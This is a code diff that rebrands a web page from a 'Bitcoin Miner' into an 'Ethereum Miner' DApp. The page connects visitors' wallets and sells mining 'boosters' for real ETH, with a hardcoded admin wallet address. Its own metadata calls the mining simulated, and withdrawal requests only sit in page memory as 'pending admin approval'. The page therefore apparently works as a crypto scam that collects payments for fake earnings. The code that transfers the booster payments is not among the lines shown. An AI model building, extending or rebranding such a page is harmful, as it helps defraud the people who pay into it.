@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>💰 Bitcoin Miner 💰</title>
+  <title>💰 Ethereum Miner 💰</title>
   <style>
     /* Base Beautification Styles */
     body {
@@ -103,13 +103,14 @@
 </head>
 <body>
   <!-- Header & Coin Animation -->
-  <h1>$ Bitcoin Miner $</h1>
+  <h1>$ Ethereum Miner $</h1>
   <div class="coin">
     <div class="coin-face">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Coin Front">
+      <!-- Ethereum logo image -->
+      <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=013" alt="Ethereum Coin Front">
     </div>
     <div class="coin-face coin-back">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Coin Back">
+      <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=013" alt="Ethereum Coin Back">
     </div>
   </div>
 
@@ -119,10 +120,10 @@
 
   <div id="miner">
     <h2>Miner Interface ⚒️</h2>
-    <p>Mined BTC: <span id="minedAmount">0</span> BTC 💰</p>
+    <p>Mined ETH: <span id="minedAmount">0</span> ETH 💰</p>
     <p>Time Remaining: <span id="timeRemaining">10:00</span> ⏳</p>
     <button id="startMiningBtn">Start Mining ⛏️</button>
-    <button id="withdrawBtn" disabled>Withdraw Mined BTC 💵</button>
+    <button id="withdrawBtn" disabled>Withdraw Mined ETH 💵</button>
     <br><br>
     <!-- Booster Buttons -->
     <button id="purchaseBoosterBtn">Purchase Booster 1 (0.030 ETH) 🚀</button>
@@ -133,7 +134,7 @@
     <p>Your Booster 3 Count: <span id="boosterCount3">0</span> 🔥</p>
     <!-- Booster Info -->
     <p class="booster-info">
-      Booster 1 increases your mining rate by 0.000000001000 BTC/s, Booster 2 by 0.000000002000 BTC/s, and Booster 3 by 0.000000003500 BTC/s.
+      Booster 1 increases your mining rate by 0.000000001000 ETH/s, Booster 2 by 0.000000002000 ETH/s, and Booster 3 by 0.000000003500 ETH/s.
     </p>
 
     <!-- User Withdrawal History -->
@@ -142,7 +143,7 @@
       <table id="userWithdrawalTable">
         <thead>
           <tr>
-            <th>Amount (BTC)</th>
+            <th>Amount (ETH)</th>
             <th>Status</th>
           </tr>
         </thead>
@@ -161,7 +162,7 @@
       <thead>
         <tr>
           <th>User Wallet</th>
-          <th>Amount (BTC)</th>
+          <th>Amount (ETH)</th>
           <th>Status</th>
           <th>Actions</th>
         </tr>
@@ -184,7 +185,7 @@
 
     // Configuration parameters.
     const adminAddress = "0xde45f6a59A96DaA0AE7f26BAd254aA88241b8D04";
-    const MIN_WITHDRAWAL = 0.010000000000; // 0.01 BTC
+    const MIN_WITHDRAWAL = 0.010000000000; // 0.01 ETH
     const BOOSTER_INCREMENT1 = 0.000000001000;
     const BOOSTER_COST_ETH1 = 0.030;
     const BOOSTER_INCREMENT2 = 0.000000002000;
@@ -233,10 +234,10 @@
             mobileLinks: ["trust", "metamask", "rainbow", "argent", "imtoken", "pillar"],
             showQrModal: true,
             metadata: {
-              name: "Bitcoin Miner",
-              description: "A simulated Bitcoin mining DApp.",
-              url: "https://minebitcoinminer.netlify.app",
-              icons: ["https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg"]
+              name: "Ethereum Miner",
+              description: "A simulated Ethereum mining DApp.",
+              url: "https://mineethereumminer.netlify.app",
+              icons: ["https://cryptologos.cc/logos/ethereum-eth-logo.png?v=013"]
             }
           });
           await provider.enable();
@@ -304,7 +305,7 @@
 
     document.getElementById('startMiningBtn').addEventListener('click', function() {
       if (sessionFinished && minedAmount > 0) {
-        const confirmSave = confirm("Your finished session mined " + minedAmount.toFixed(12) + " BTC 💰. " +
+        const confirmSave = confirm("Your finished session mined " + minedAmount.toFixed(12) + " ETH 💰. " +
                                       "This will be saved as a pending withdrawal before starting a new session. Proceed?");
         if (confirmSave) {
           if (!withdrawals[userAccount]) withdrawals[userAccount] = [];
@@ -324,10 +325,10 @@
 
     document.getElementById('withdrawBtn').addEventListener('click', function() {
       if (minedAmount < MIN_WITHDRAWAL) {
-        alert("You must have at least " + MIN_WITHDRAWAL.toFixed(12) + " BTC to withdraw. ⛔");
+        alert("You must have at least " + MIN_WITHDRAWAL.toFixed(12) + " ETH to withdraw. ⛔");
         return;
       }
-      let withdrawAmount = prompt("Enter withdrawal amount (available: " + minedAmount.toFixed(12) + " BTC):");
+      let withdrawAmount = prompt("Enter withdrawal amount (available: " + minedAmount.toFixed(12) + " ETH):");
       withdrawAmount = parseFloat(withdrawAmount);
       if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
         alert("Invalid withdrawal amount. ⛔");
@@ -338,12 +339,12 @@
         return;
       }
       if (withdrawAmount < MIN_WITHDRAWAL) {
-        alert("Minimum withdrawal is " + MIN_WITHDRAWAL.toFixed(12) + " BTC. ⛔");
+        alert("Minimum withdrawal is " + MIN_WITHDRAWAL.toFixed(12) + " ETH. ⛔");
         return;
       }
       if (!withdrawals[userAccount]) withdrawals[userAccount] = [];
       withdrawals[userAccount].push({ amount: withdrawAmount, status: 'pending' });
-      alert("Your withdrawal request for " + withdrawAmount.toFixed(12) + " BTC is pending admin approval. ⏳");
+      alert("Your withdrawal request for " + withdrawAmount.toFixed(12) + " ETH is pending admin approval. ⏳");
       minedAmount -= withdrawAmount;
       document.getElementById('minedAmount').innerText = minedAmount.toFixed(12);
       minedProgress[userAccount] = minedAmount;
